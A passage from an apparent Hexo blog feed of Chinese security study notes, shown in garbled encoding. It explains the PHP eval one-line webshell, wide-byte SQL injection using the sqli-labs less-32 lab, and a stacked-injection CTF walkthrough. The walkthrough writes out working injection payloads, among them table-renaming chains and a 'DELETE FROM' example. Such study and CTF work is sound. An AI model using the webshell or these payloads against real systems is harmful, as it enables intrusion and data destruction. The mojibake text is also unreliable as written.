title="å¸¸è§çš„webshellæœ‰å“ªäº›ï¼Ÿ"></a>å¸¸è§çš„webshellæœ‰å“ªäº›ï¼Ÿ</h3><p>1.å¤§é©¬ã€å°é©¬ã€ä¸€å¥è¯æœ¨é©¬ã€èœåˆ€é©¬ã€è„±åº“é©¬ã€å„ç§é©¬â€¦ç­‰</p><p>2ï¼Œæ‹¥æœ‰è¾ƒå®Œæ•´åŠŸèƒ½çš„webshellï¼Œæˆ‘ä»¬ä¸€èˆ¬ç§°ä¸ºå¤§é©¬</p><p>3.åŠŸèƒ½ç›¸å¯¹ç®€å•çš„webshellæˆä¸ºå°é©¬</p><h3 id="webshellæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ"><a href="#webshellæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ" class="headerlink" title="webshellæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ"></a>webshellæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ</h3><h3 id="æ€æ ·èƒ½è·å–getshellï¼Ÿ"><a href="#æ€æ ·èƒ½è·å–getshellï¼Ÿ" class="headerlink" title="æ€æ ·èƒ½è·å–getshellï¼Ÿ"></a>æ€æ ·èƒ½è·å–getshellï¼Ÿ</h3><h3 id="webshellä¹‹phpä¸€å¥è¯æœ¨é©¬è§£è¯»"><a href="#webshellä¹‹phpä¸€å¥è¯æœ¨é©¬è§£è¯»" class="headerlink" title="webshellä¹‹phpä¸€å¥è¯æœ¨é©¬è§£è¯»"></a>webshellä¹‹phpä¸€å¥è¯æœ¨é©¬è§£è¯»</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_post[x]);?&gt;</span><br></pre></td></tr></table></figure><p>$_post[x]:è·å–postè¯·æ±‚å‚æ•°ä¸­xçš„å€¼ã€‚ä¾‹å¦‚postè¯·æ±‚ä¸­ä¼ é€’x=phpinfo(); , é‚£ä¹ˆ$_post[x]å°±ç­‰åŒäº</p><p>phpinfo(); </p><p>eval()å°†å­—ç¬¦ä¸²å½“åšPHPä»£ç è¿è¡Œã€‚ä¾‹å¦‚eval(â€™phpinfo();â€™) , å…¶ä¸­phpinfo();ä¼šè¢«å½“åšPHPä»£ç å»æ‰§è¡Œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[X]);?&gt;    å®é™…ä¸Šçš„ä¼ é€’è¿‡ç¨‹æ˜¯è¿™æ ·çš„</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php @eval(`phpinfo();`);?&gt;   å®é™…çš„è¯­å¥æ˜¯è¿™æ ·çš„</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡è¯¥webshellï¼Œä¼ é€’ä»»æ„phpä»£ç ï¼Œ</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®½å­—èŠ‚æ³¨å…¥</title>
      <link href="/2023/05/17/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/17/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="å®½å­—èŠ‚æ³¨å…¥åŸç†"><a href="#å®½å­—èŠ‚æ³¨å…¥åŸç†" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥åŸç†"></a>å®½å­—èŠ‚æ³¨å…¥åŸç†</h2><p>å®½å­—èŠ‚å°±æ˜¯ä¸¤ä¸ªä»¥ä¸Šçš„å­—èŠ‚ï¼Œå®½å­—èŠ‚æ³¨å…¥äº§ç”Ÿçš„åŸå› å°±æ˜¯å„ç§å­—ç¬¦ç¼–ç çš„ä¸å½“æ“ä½œï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡å®½å­—èŠ‚ç¼–ç ç»•è¿‡sqlæ³¨å…¥é˜²å¾¡ã€‚</p><h3 id="å¸¸è§çš„å­—ç¬¦é›†"><a href="#å¸¸è§çš„å­—ç¬¦é›†" class="headerlink" title="å¸¸è§çš„å­—ç¬¦é›†"></a>å¸¸è§çš„å­—ç¬¦é›†</h3><p>asciiç¼–ç ï¼šå•å­—èŠ‚ç¼–ç </p><p>0x00 null<br>0x20<br>0x21 !<br>0x22 â€œ<br>0x23 #<br>0x24 $<br>0x25 %<br>0x26 &amp;<br>0x27 â€™<br>0x28 (<br>0x29)<br>0x2A *<br>0x2B +<br>0x2C ,<br>0x2D -<br>0x2E .<br>0x2F /<br>0x3A :<br>0x3B ;<br>0x3C &lt;<br>0x3D =<br>0x3E &gt;<br>0x3F ?<br>0x40 @<br>0x5B [<br>0x5C<br>0x5D ]<br>0x5E ^<br>0x5F _<br>0x60 `<br>0x7B {<br>0x7C |<br>0x7D }<br>0x7E ~</p><p>latin1ç¼–ç ï¼šå•å­—èŠ‚ç¼–ç </p><p>gbkç¼–ç ï¼šä½¿ç”¨ä¸€å­—èŠ‚å’ŒåŒå­—èŠ‚ç¼–ç ï¼Œ0x00-0x7FèŒƒå›´å†…æ˜¯ä¸€ä½ï¼Œå’Œasciiä¿æŒä¸€è‡´ã€‚åŒå­—èŠ‚çš„ç¬¬ä¸€ä¸ªå­—èŠ‚èŒƒå›´æ˜¯0x81-0xFE</p><p>utf-8ç¼–ç ï¼šä½¿ç”¨ä¸€è‡³å››å­—èŠ‚ç¼–ç ï¼Œ0x00-0x7FèŒƒå›´å†…æ˜¯ä¸€ä½ï¼Œå’Œasciiä¿æŒä¸€è‡´ã€‚å…¶ä»–å­—ç¬¦ç”¨äºŒè‡³å››ä¸ªå­—èŠ‚å˜é•¿è¡¨ç¤ºã€‚</p><h3 id="MySQLå­—ç¬¦è½¬æ¢"><a href="#MySQLå­—ç¬¦è½¬æ¢" class="headerlink" title="MySQLå­—ç¬¦è½¬æ¢"></a>MySQLå­—ç¬¦è½¬æ¢</h3><p>æ•°æ®æäº¤åˆ°mysqlæ•°æ®åº“ï¼Œéœ€è¦è¿›è¡Œå­—ç¬¦é›†çš„è½¬æ¢ï¼Œä½¿å¾—mysqlæ•°æ®åº“å¯ä»¥å¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸‰ä¸ªæ­¥éª¤ï¼š</p><p>æ”¶åˆ°è¯·æ±‚ï¼Œå°†è¯·æ±‚æ•°æ®ä»character_set_client -&gt;character_set_connection.</p><p>å†…éƒ¨æ“ä½œï¼Œå°†æ•°æ®ä»character_set_connection  â€“&gt;è¡¨åˆ›å»ºçš„å­—ç¬¦é›†ã€‚</p><p>ç»“æœè¾“å‡ºï¼Œå°†æ•°æ®ä»è¡¨åˆ›å»ºçš„å­—ç¬¦é›† â€“&gt;character_set_resultsã€‚</p><p>å½“æ‰§è¡Œset names â€charsetâ€ï¼Œç›¸å½“äºæ‰§è¡Œ</p><p>set character_set_client = charset</p><p>set character_set_connection = charset</p><p>set character_set_results = charset</p><p>client æŒ‡çš„æ˜¯phpç¨‹åº</p><p>connectionæŒ‡çš„æ˜¯phpå®¢æˆ·ç«¯ä¸mysqlæœåŠ¡å™¨ä¹‹é—´è¿æ¥å±‚</p><p>results æŒ‡çš„æ˜¯mysqlæœåŠ¡å™¨è¿”å›ç»™PHPå®¢æˆ·ç«¯çš„ç»“æœ</p><h3 id="sqli-labs-less-32"><a href="#sqli-labs-less-32" class="headerlink" title="sqli-labs/less-32"></a>sqli-labs/less-32</h3><p>1.æŸ¥çœ‹æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote with a backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_addslashes($_GET[&#x27;id&#x27;]);</span><br><span class="line">//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line"></span><br><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;font color= &quot;#00FF00&quot;&gt;&#x27;;</span><br><span class="line">  echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ™®é€šæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/17/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20230521112543826.png" alt="image-20230521112543826"></p><p>ç¬¬ä¸€æ­¥ï¼šè¢«check_addslasheså‡½æ•°è½¬ä¹‰</p><p><code>check_addslashes</code> å‡½æ•°å¹¶ä¸æ˜¯å®Œå…¨å®‰å…¨çš„ï¼Œå› ä¸ºå®ƒåªæ˜¯ç®€å•åœ°æ·»åŠ åæ–œæ æ¥è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ã€‚</p><p>ç¬¬äºŒæ­¥ï¼šåœ¨æ‰§è¡ŒsqlæŸ¥è¯¢ä¹‹å‰ï¼Œmysql_query(â€œSET NAMES gbkâ€);å°†MySQLçš„ä¸‰ä¸ªå­—ç¬¦é›†è®¾ç½®ä¸º gbk ç¼–ç </p><p>ç¬¬ä¸‰æ­¥ï¼šcharacter_set_clientå‘Šè¯‰MySQL Serverï¼Œä¼ å…¥çš„æ˜¯gbkç¼–ç ï¼Œä¹Ÿå°±æ˜¯â€™è¢«å½“åšäº†%5C%27ä¼ å…¥</p><p>ç¬¬å››æ­¥ï¼šcharacter_set_client â€“&gt;character_set_connectionç¼–ç å®Œå…¨ä¸€è‡´ï¼Œæ•°æ®æ²¡æœ‰ä»»ä½•è½¬æ¢ï¼Œæ‰€ä»¥è¾“å…¥æ˜¯%5C%27,è¾“å‡ºçš„æ˜¯%5%27</p><p>ç¬¬äº”æ­¥ï¼šcharacter_set_connection  â€“&gt;table charsetè¿™é‡Œæˆ‘ä»¬éœ€è¦å…³æ³¨ä¸‹ä½¿ç”¨çš„è¡¨çš„å­—ç¬¦é›†ã€‚</p><p><img src="/2023/05/17/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20230521203503187.png" alt="image-20230521203503187"></p><p>å¯ä»¥çœ‹åˆ°idå‚æ•°æ²¡æœ‰è®¾ç½®ç¼–ç æ–¹å¼ï¼Œä¸ä¼šå¯¹%5C%27è¿›è¡Œå¤„ç†ã€‚åœ¨è¿™é‡ŒmysqlæœåŠ¡å™¨å°†æŸ¥è¯¢è¯­å¥æ‰§è¡Œï¼Œå¹¶è¿”å›ç»“æœã€‚</p><p>æ‰§è¡Œçš„sqlè¯­å¥ä¸ºï¼š</p><p>$sql=â€œSELECT * FROM users WHERE id=â€˜1â€™â€™ LIMIT 0,1â€;<br> â€˜è¢«è½¬ä¹‰æ— æ³•è¿›è¡Œæ³¨å…¥</p><p>ç¬¬å…­æ­¥ï¼štable charset â€“&gt;character_set_resultså­—ç¬¦é›†ä¹Ÿè®¾å®šä¸ºgbkï¼Œä¿è¯äº†è¾“å‡ºå†…å®¹æ²¡æœ‰ä¹±ç ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å †å æ³¨å…¥</title>
      <link href="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="å †å æ³¨å…¥åŸç†"><a href="#å †å æ³¨å…¥åŸç†" class="headerlink" title="å †å æ³¨å…¥åŸç†"></a>å †å æ³¨å…¥åŸç†</h2><p>mysqlæ•°æ®åº“sqlè¯­å¥çš„é»˜è®¤ç»“å°¾æ˜¯ä»¥ <strong>;</strong> ç»“å°¾ï¼Œåœ¨æ‰§è¡Œå¤šæ¡sqlè¯­å¥æ—¶è¦ä½¿ç”¨ç»“æŸç¬¦éš”å¼€ï¼Œé‚£ä¹ˆåœ¨ <strong>ï¼›</strong>ç»“æŸä¸€æ¡sqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•å°±é€ æˆäº†å †å æ³¨å…¥ã€‚</p><p>è€Œunion injection(è”åˆæ³¨å…¥)ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…æœ‰ä»€ä¹ˆåŒºåˆ«å˜›ï¼Ÿ</p><p>åŒºåˆ«å°±åœ¨äºunionæˆ–è€…union all æ‰§è¡Œçš„è¯­å¥ç±»å‹æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM products</span><br><span class="line">æœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼š Select * from products where productid=1;DELETE FROM products</span><br><span class="line">å½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤</span><br></pre></td></tr></table></figure><h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>1.å…ˆåˆ¤æ–­æ³¨å…¥ç±»å‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202114862.png" alt="image-20230516202114862"></p><p>æ­£å¸¸æ˜¾ç¤ºï¼Œå†è¯•è¯•åˆ«çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202210837.png" alt="image-20230516202210837"></p><p>å‡ºç°é”™è¯¯ï¼Œè¯´æ˜å­˜åœ¨æ³¨å…¥ï¼Œçœ‹ä¸€ä¸‹æŠ¥é”™ä¿¡æ¯ï¼Œæ²¡æœ‰æ˜¾ç¤ºæœ‰ç”¨çš„ä¿¡æ¯ï¼Œåœ¨è¯•è¯•ä¸‡èƒ½æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1;#</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202509807.png" alt="image-20230516202509807"></p><p>2.å¯ä»¥åˆ¤æ–­ä¸€ä¸‹å­—æ®µæ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 3#    </span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516203725859.png" alt="image-20230516203725859"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2#</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516204018371.png" alt="image-20230516204018371"></p><p>è¯´æ˜å­—æ®µæ•°ä¸º2</p><p>ç„¶åæˆ‘ä»¬å°è¯•ä¸€ä¸‹ç”¨è”åˆæ³¨å…¥çœ‹ä¸€ä¸‹</p><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516204230761.png" alt="image-20230516204230761"></p><p>perg_mathå‡½æ•°æ˜¯æ­£åˆ™å‡½æ•°ï¼Œä»æŠ¥é”™ä¿¡æ¯æˆ‘ä»¬å‘ç°selectè¢«æ­£åˆ™åŒ¹é…è¿‡æ»¤æ‰äº†</p><p>æˆ‘ä»¬å†è¯•è¯•åˆ«çš„æ–¹æ³•</p><p>3.æŸ¥çœ‹æ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516205244193.png" alt="image-20230516205244193"></p><p>æ‰§è¡Œä¸Šé¢çš„è¯­å¥ï¼Œæˆ‘ä»¬å‘ç°ç¬¬ä¸€å¥æ»¡è¶³æ¡ä»¶çš„è¯­å¥ä¹‹åï¼Œè¿˜èƒ½åœ¨æ‰§è¡Œä¸‹ä¸€æ¡ï¼Œæ²¡æœ‰æ¡ä»¶é™åˆ¶</p><p>4.æŸ¥çœ‹è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables from supersqli;#</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516210127648.png" alt="image-20230516210127648"></p><p><strong>æ³¨æ„ï¼šå¦‚æœæŸ¥çœ‹çš„è¡¨åæ˜¯å­—ç¬¦ä¸²ï¼Œå°±éœ€è¦åŠ ä¸Šåå¼•å·(`),è‹±æ–‡è¾“å…¥æ³•ä¸‹æŒ‰escä¸‹é¢é‚£ä¸ªé”®</strong></p><p>æŸ¥çœ‹å­—ç¬¦ä¸²è¡¨ä¸­çš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;use supersqli;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516210857498.png" alt="image-20230516210857498"></p><p>å†æŸ¥çœ‹wordsè¡¨çœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;use supersqli;show columns from words;#</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516211257044.png" alt="image-20230516211257044"></p><p>varchar()æ˜¯ä¸€ç§æ¯”charçµæ´»çš„æ•°æ®ç±»å‹ï¼Œæ˜¯å¯ä»¥ä¿å­˜å¯å˜é•¿çš„å­—ç¬¦ä¸²</p><p>æ ¹æ®ä¸¤ä¸ªè¡¨çš„æƒ…å†µç»“åˆå®é™…æŸ¥è¯¢å‡ºç»“æœ,åˆ¤æ–­å‡ºwordsæ˜¯é»˜è®¤æŸ¥è¯¢çš„è¡¨ï¼Œå› ä¸ºæŸ¥è¯¢å‡ºçš„ç»“æœæ˜¯ä¸€ä¸ªæ•°å­—åŠ ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œwordsè¡¨ç»“æ„ä¹Ÿæ˜¯idï¼ˆæ•°å­—ï¼‰å’Œdataï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼ŒæŸ¥è¯¢ä¼ å…¥å‚æ•°ä¹Ÿå°±æ˜¯èµ‹å€¼ç»™äº†id</p><h2 id="renameå’Œalertç”¨æ³•"><a href="#renameå’Œalertç”¨æ³•" class="headerlink" title="renameå’Œalertç”¨æ³•"></a>renameå’Œalertç”¨æ³•</h2><p>renameï¼šä¿®æ”¹ä¸€ä¸ªæˆ–è€…å¤šä¸ªè¡¨çš„åç§°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename table old_table_name to new_table_name;</span><br></pre></td></tr></table></figure><p>alter :å‘è¡¨ä¸­æ·»åŠ å­—æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table [è¡¨å] add [åˆ—å] ç±»å‹</span><br></pre></td></tr></table></figure><p>ä¿ç•™oldå’Œnewåˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åˆ—åï¼ša ----&gt;b åˆ—ç±»å‹</span><br><span class="line">     alter table t1 change a b integer;</span><br></pre></td></tr></table></figure><p>æ”¹å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename table `words` to words2;rename table `1919810931114514` to words;alter table words change flag id varchar(100);show tables;#</span><br></pre></td></tr></table></figure><p>æ›´æ”¹è¡¨ååˆ—å</p><p>1ï¼Œé€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚</p><p>2ï¼ŒæŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚</p><p>3 ï¼Œç»™æ–° words è¡¨æ·»åŠ æ–°çš„åˆ—å id ã€‚</p><p>4ï¼Œå°† flag æ”¹åä¸º data ã€‚</p><p><code>show tables</code>ä¸»è¦çœ‹çœ‹æ”¹æˆåŠŸæ²¡æœ‰ï¼Œè¿™é‡Œæ”¹è¡¨åè¦æœ‰é¡ºåºï¼Œå¦‚æœå…ˆæ”¹æ•°å­—è¡¨ï¼Œé‚£å°±å‡ºç°ä¸¤ä¸ªwordsè¡¨ï¼Œå¯¼è‡´è¯­å¥ä¸èƒ½æ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦å…ˆæ”¹wordsè¡¨åä¸ºå…¶ä»–åå­—ï¼Œç„¶åä¿®æ”¹æ•°å­—è¡¨ä¸ºwordsï¼›é¿å…å› ä¸ºåå­—è€Œå‘ç”Ÿå‘½ä»¤å†²çª</p><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516214010853.png" alt="image-20230516214010853"></p><p>æœ€åç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=1#</span><br></pre></td></tr></table></figure><p>çœ‹å›æ˜¾æ•°æ®</p><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516214204616.png" alt="image-20230516214204616"></p><p>å¾—åˆ°flag</p><p>è¿™ä¸ªå¤§ä½¬çš„wpä¸é”™ï¼ï¼ï¼</p><p><a href="https://ttoc.fun/2022/06/21/buuctf-wp/">https://ttoc.fun/2022/06/21/buuctf-wp/</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨</title>
      <link href="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
      <url>/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
      
